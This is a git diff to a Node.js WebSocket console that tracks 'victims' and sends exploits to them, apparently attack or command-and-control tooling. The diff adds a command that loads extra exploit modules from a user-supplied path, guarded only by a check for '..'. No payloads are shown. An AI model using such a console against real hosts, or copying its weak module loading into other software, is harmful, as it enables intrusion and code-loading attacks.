@@ -3,13 +3,14 @@ const ws = require('ws')
 
 const config = require('./config')
 const client = require('./client')
-const exploits = require('./exploits')
+let exploits = require('./exploits')
 
 const victims = {}
 const cmds = {
     'help': help,
     'list': list,
-    'exploit': exploit
+    'exploit': exploit,
+    'addsploits': addsploits
 }
 
 function help(conn) {
@@ -55,8 +56,25 @@ function exploit(conn, args) {
     console.log('Sent ' + what + ' to ' + who)
 }
 
+function addsploits(conn, args) {
+    if(args.length < 1) {
+        conn.send('Usage: import package')
+        return
+    }
+    try {
+        const dir_trav = ['..']
+        if(dir_trav.some(s => args[0].includes(s))) {
+            conn.send('You can only import sploits from child directories')
+            return
+        }
+        exploits = {...exploits, ...require('./exploits/' + args[0])}
+        conn.send('' + args[0] + ' was successfully added')
+    } catch {
+        conn.send('' + args[0] + ' could not be added')
+    }
+}
+
 function handle_cmd(conn, cmd, args) {
-    // TODO Add an import command to allow importing custom exploits
     if(undefined === cmds[cmd]) {
         conn.send('Implemented commands: ' + Object.keys(cmds).join(','))
     } else {
